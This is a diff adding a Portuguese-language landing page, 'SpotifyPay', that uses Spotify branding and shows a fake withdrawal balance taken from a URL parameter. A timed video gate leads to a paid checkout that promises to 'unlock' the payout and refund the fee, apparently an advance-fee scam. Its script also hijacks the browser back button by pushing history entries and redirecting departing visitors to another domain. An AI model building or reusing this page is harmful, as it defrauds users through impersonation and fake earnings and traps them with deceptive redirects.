@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+
+<html lang="pt-BR">
+<head>
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>SpotifyPay - Liberar Saque</title>
+
+<!-- Google Font -->
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap">
+
+<!-- UTMIFY -->
+
+<script src="js/latest_1.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+
+<!-- Meta Pixel -->
+
+<script>
+!function(f,b,e,v,n,t,s){
+if(f.fbq)return;
+n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;
+n.push=n;
+n.loaded=true;
+n.version='2.0';
+n.queue=[];
+t=b.createElement(e);
+t.async=true;
+t.src=v;
+s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)
+}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+
+fbq('init','4053625494857896');
+fbq('track','PageView');
+</script>
+
+<noscript>
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4053625494857896&ev=PageView&noscript=1"/>
+</noscript>
+
+<!-- Pixel Script -->
+
+<script src="js/pixel.js" async defer></script>
+
+<!-- UTM Script -->
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+
+</head>
+
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background: white;
+      color: #333;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Animações */
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.02); }
+    }
+
+    @keyframes glow {
+      0%, 100% { box-shadow: 0 0 5px rgba(29, 185, 84, 0.5); }
+      50% { box-shadow: 0 0 20px rgba(29, 185, 84, 0.8), 0 0 30px rgba(29, 185, 84, 0.4); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes shimmer {
+      0% { background-position: -200% 0; }
+      100% { background-position: 200% 0; }
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+
+    /* Header */
+    .header {
+      width: 100%;
+      background: linear-gradient(135deg, #1DB954, #169c45);
+      color: white;
+      font-weight: 600;
+      text-align: center;
+      padding: 15px 20px;
+      font-size: 14px;
+      letter-spacing: 0.5px;
+      box-shadow: 0 4px 15px rgba(29, 185, 84, 0.3);
+    }
+
+    .header span {
+      animation: bounce 2s ease-in-out infinite;
+      display: inline-block;
+    }
+
+    /* Container Principal */
+    .main-container {
+      width: 100%;
+      max-width: 420px;
+      padding: 0 15px;
+      animation: fadeIn 0.5s ease-out;
+    }
+
+    /* Barra Superior */
+    #p1 {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.98);
+      padding: 15px 20px;
+      border-radius: 0 0 20px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+    }
+
+    #logo { 
+      width: 80px; 
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+    }
+
+    .boxSaldo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: linear-gradient(135deg, #1DB954, #169c45);
+      border-radius: 12px;
+      padding: 10px 20px;
+      animation: glow 2s ease-in-out infinite;
+    }
+
+    .textoSaldo { 
+      font-size: 10px; 
+      font-weight: 600; 
+      color: rgba(255,255,255,0.9);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .valorSaldo { 
+      font-size: 20px; 
+      font-weight: 700; 
+      color: white;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+    }
+
+    /* Card do Produto */
+    #produto1 {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.98);
+      border-radius: 20px;
+      text-align: center;
+      padding: 25px 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+    }
+
+    .badge-verificado {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: linear-gradient(135deg, #1DB954, #169c45);
+      color: white;
+      padding: 6px 15px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      margin-bottom: 15px;
+    }
+
+    .badge-verificado::before {
+      content: '✓';
+    }
+
+    #produto1 h4 { 
+      color: #1DB954; 
+      font-size: 22px; 
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+
+    #produto1 > p {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+
+ 
+
+
+    /* Mensagem de Espera */
+    .mensagemBotao {
+      font-size: 13px;
+      color: #666;
+      margin-top: 20px;
+      padding: 12px 20px;
+      background: #fff3cd;
+      border-radius: 10px;
+      border-left: 4px solid #ffc107;
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    /* Botão Desbloquear */
+    #botaoDesbloquear {
+      display: none;
+      margin-top: 20px;
+      width: 100%;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    #desbloquearLink {
+      width: 100%;
+      text-decoration: none;
+    }
+
+    #desbloquearLink button {
+      background: linear-gradient(135deg, #1DB954, #169c45);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      width: 100%;
+      height: 60px;
+      font-weight: 700;
+      font-size: 18px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 20px rgba(29, 185, 84, 0.4);
+      position: relative;
+      overflow: hidden;
+    }
+
+    #desbloquearLink button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      animation: shimmer 2s infinite;
+    }
+
+    #desbloquearLink button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(29, 185, 84, 0.5);
+    }
+
+    #desbloquearLink button:active {
+      transform: translateY(0);
+    }
+
+    .seguranca-info {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      color: #999;
+      font-size: 11px;
+      margin-top: 10px;
+    }
+
+    /* Benefícios */
+    .beneficios {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 20px;
+      text-align: left;
+    }
+
+    .beneficio-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 15px;
+      background: #f8f9fa;
+      border-radius: 10px;
+      font-size: 13px;
+      color: #444;
+    }
+
+    .beneficio-item .icon {
+      width: 24px;
+      height: 24px;
+      background: linear-gradient(135deg, #1DB954, #169c45);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 12px;
+      flex-shrink: 0;
+    }
+
+    /* Footer */
+    .footer-info {
+      text-align: center;
+      padding: 20px;
+      color: rgba(255,255,255,0.6);
+      font-size: 11px;
+    }
+
+    @media (max-width: 380px) {
+      .header { font-size: 12px; padding: 12px 15px; }
+      #produto1 h4 { font-size: 20px; }
+      #desbloquearLink button { font-size: 16px; height: 55px; }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="header">
+    <span></span> ASSISTA O VÍDEO PARA LIBERAR SEU SAQUE
+  </div>
+
+  <div class="main-container">
+    <div id="p1">
+      <img id="logo" src="images/spotify2-logo.png" alt="Spotify Logo">
+      <div class="boxSaldo">
+        <span class="textoSaldo">Seu Saldo</span>
+        <span class="valorSaldo">R$ <span class="saldoAtualizado">473.00</span></span>
+      </div>
+    </div>
+
+    <div id="produto1">
+      
+      <h4>LIBERAR SEU SAQUE</h4>
+      <p>Assista o vídeo completo para desbloquear</p>
+
+      <div id="videoWrapper">
+  <vturb-smartplayer id="vid-69d9cac78a1b9c7cc053127f" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
+  <script type="text/javascript">
+    var s = document.createElement("script");
+    s.src = "https://scripts.converteai.net/52fff2da-9d50-4ca7-8305-99623dfd9bd1/players/69d9cac78a1b9c7cc053127f/v4/player.js";
+    s.async = true;
+    document.head.appendChild(s);
+  </script>
+</div>
+
+      <div id="mensagem" class="mensagemBotao">
+        O botão de saque aparecerá em instantes...
+      </div>
+
+      <div id="botaoDesbloquear">
+        <a id="desbloquearLink" href="https://checkout.perfectpay.com.br/pay/PPU38CQ09NE?">
+          <button>DESBLOQUEAR MEU SAQUE</button>
+        </a>
+        
+        <div class="seguranca-info">
+          © Ambiente 100% seguro e criptografado
+        </div>
+
+        <div class="beneficios">
+          <div class="beneficio-item">
+            <span class="icon">✓</span>
+            <span>Saque liberado em até 24 horas via PIX</span>
+          </div>
+          <div class="beneficio-item">
+            <span class="icon">✓</span>
+            <span>Taxa devolvida junto com seu saque</span>
+          </div>
+          <div class="beneficio-item">
+            <span class="icon">✓</span>
+            <span>Acesso vitalício à plataforma</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer-info">
+    © 2026 SpotifyPay - Todos os direitos reservados
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      
+      // Atualizar saldo com o valor da URL
+      const saldo = urlParams.get('saldo');
+      if (saldo) {
+        document.querySelectorAll('.saldoAtualizado').forEach(el => {
+          el.textContent = parseFloat(saldo).toFixed(2);
+        });
+      }
+      
+     // Exibir botão após 15 segundos
+setTimeout(function () {
+  const botao = document.getElementById("botaoDesbloquear");
+  const mensagem = document.getElementById("mensagem");
+
+  botao.style.display = "flex";
+  botao.style.animation = "fadeIn 0.5s ease-out";
+  mensagem.style.display = "none";
+
+}, 15000);
+
+      // Adiciona parâmetros da URL ao link
+      const paramsString = urlParams.toString();
+      const desbloquearLink = document.getElementById("desbloquearLink");
+
+      if (paramsString) {
+        desbloquearLink.href += `?${paramsString}`;
+      }
+
+      // Back redirect anti-abandono
+      const link = 'https://acessaragora.shop/branca/back/01/';
+      const redirectUrl = link + (link.includes('?') ? '&' : '?') + urlParams.toString();
+
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+
+      window.addEventListener('popstate', () => {
+        setTimeout(() => {
+          location.href = redirectUrl;
+        }, 1);
+      });
+    }); // 🔥 META PIXEL - INÍCIO DE CHECKOUT
+
+if (desbloquearLink) {
+  desbloquearLink.addEventListener("click", function () {
+    if (typeof fbq === "function") {
+      fbq('track', 'InitiateCheckout');
+    }
+  });
+}
+  </script>
+
+<script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
+<link rel="preload" href="https://scripts.converteai.net/52fff2da-9d50-4ca7-8305-99623dfd9bd1/players/69d9cac78a1b9c7cc053127f/v4/player.js" as="script">
+<link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+<link rel="preload" href="https://cdn.converteai.net/52fff2da-9d50-4ca7-8305-99623dfd9bd1/69d9cac3613eeca7e2de4196/main.m3u8" as="fetch">
+<link rel="dns-prefetch" href="https://cdn.converteai.net">
+<link rel="dns-prefetch" href="https://scripts.converteai.net">
+<link rel="dns-prefetch" href="https://images.converteai.net">
+<link rel="dns-prefetch" href="https://api.vturb.com.br">
+
+</body></html>
